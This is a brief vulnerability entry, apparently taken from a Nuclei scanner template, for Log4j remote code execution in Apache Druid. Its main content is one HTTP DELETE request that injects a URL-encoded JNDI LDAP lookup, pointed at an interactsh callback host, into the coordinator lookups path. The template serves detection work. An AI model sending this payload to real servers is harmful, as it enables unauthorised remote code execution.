# Vulnerability: Apache Druid - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`apache-druid-log4j-rce.yaml`)

## Description
Apache Druid is vulnerable to RCE due to Log4j.

## Vulnerable Code Pattern / Exploit Payload
```http
DELETE {{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d
```

